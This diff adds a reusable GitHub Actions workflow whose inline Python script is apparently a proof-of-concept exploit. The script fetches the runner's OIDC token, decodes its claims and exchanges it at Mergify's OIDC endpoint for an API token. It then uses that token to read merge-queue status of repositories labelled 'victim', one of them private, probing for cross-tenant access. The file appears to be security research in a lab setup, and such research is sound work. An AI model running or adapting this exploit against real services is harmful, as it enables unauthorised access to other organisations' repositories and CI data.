@@ -1,0 +1,30 @@
+name: zq-reusable-7731
+on:
+  workflow_call: {}
+jobs:
+  zq-reuse-job:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - shell: python
+        run: |
+          import os,json,base64,urllib.request,urllib.error
+          r=urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=https://api.mergify.com",headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+          t=json.loads(urllib.request.urlopen(r).read())["value"]; print("::add-mask::"+t)
+          c=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
+          print("CLAIMS",{k:c.get(k) for k in ["repository","repository_owner","repository_id","job_workflow_ref","workflow_ref","event_name"]})
+          def req(m,u,tok=None,b=None):
+              h={"Content-Type":"application/json","User-Agent":"curl/8.9.1"}
+              if tok: h["Authorization"]="Bearer "+tok
+              q=urllib.request.Request(u,data=json.dumps(b).encode() if b is not None else None,headers=h,method=m)
+              try:
+                  with urllib.request.urlopen(q) as x: return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+          s,b=req("POST","https://api.mergify.com/v1/ci/oidc/exchange",b={"id_token":t}); j=json.loads(b) if b.startswith("{") else {}
+          print("EXCHANGE",s,j.get("error_code"),str(j.get("detail"))[:250])
+          if s==200:
+              tok=j["token"]; print("::add-mask::"+tok)
+              for p in ["/repos/roben44-organization/zx-victim-pub/merge-queue/status","/repos/roben44-organization/zx-victim-priv/merge-queue/status","/repos/robenn044/zq-oidc-lab/merge-queue/status"]:
+                  s2,b2=req("GET","https://api.mergify.com/v1"+p,tok); print("USE",p,s2,b2[:120])
